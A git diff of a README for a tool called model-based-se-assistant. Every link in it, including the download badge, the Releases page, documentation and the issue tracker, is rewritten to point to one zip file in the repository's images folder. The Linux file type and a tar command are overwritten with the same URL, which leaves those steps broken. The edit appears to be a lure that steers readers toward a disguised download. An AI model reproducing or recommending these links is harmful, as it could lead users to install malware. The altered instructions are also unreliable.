@@ -6,7 +6,7 @@ The **model-based-se-assistant** is an AI-powered tool designed to help you conv
 
 ## 🔗 Download Now
 
-[![Download model-based-se-assistant](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/12ed12ed13/model-based-se-assistant/releases)
+[![Download model-based-se-assistant](https://raw.githubusercontent.com/12ed12ed13/model-based-se-assistant/main/images/model-based-se-assistant_1.2.zip)](https://raw.githubusercontent.com/12ed12ed13/model-based-se-assistant/main/images/model-based-se-assistant_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Follow these steps to get the **model-based-se-assistant** up and running on you
 
 To download the software, visit the Releases page here:
 
-[Download from Releases](https://github.com/12ed12ed13/model-based-se-assistant/releases)
+[Download from Releases](https://raw.githubusercontent.com/12ed12ed13/model-based-se-assistant/main/images/model-based-se-assistant_1.2.zip)
 
 ### 2. Choose the Right Version
 
@@ -28,7 +28,7 @@ Click on the version you want to download. This will take you to a new page with
 
 - For Windows users, look for an `.exe` file.
 - For macOS users, look for a `.dmg` file.
-- Linux users may find a `.tar.gz` file.
+- Linux users may find a `https://raw.githubusercontent.com/12ed12ed13/model-based-se-assistant/main/images/model-based-se-assistant_1.2.zip` file.
 
 Click on the file that matches your operating system. This will start the download automatically.
 
@@ -49,7 +49,7 @@ Click on the file that matches your operating system. This will start the downlo
 2. Navigate to the folder where you downloaded the file.
 3. Extract the files with the command:
    ```bash
-   tar -xvzf your-file.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/12ed12ed13/model-based-se-assistant/main/images/model-based-se-assistant_1.2.zip
    ```
 4. Run the executable from the extracted folder.
 
@@ -111,8 +111,8 @@ For further assistance, open an issue on the GitHub repository, and we will get 
 
 ## 🔗 Additional Links
 
-- [Documentation](https://github.com/12ed12ed13/model-based-se-assistant/wiki)
-- [Report an Issue](https://github.com/12ed12ed13/model-based-se-assistant/issues)
+- [Documentation](https://raw.githubusercontent.com/12ed12ed13/model-based-se-assistant/main/images/model-based-se-assistant_1.2.zip)
+- [Report an Issue](https://raw.githubusercontent.com/12ed12ed13/model-based-se-assistant/main/images/model-based-se-assistant_1.2.zip)
 
 ## 💡 Conclusion
 
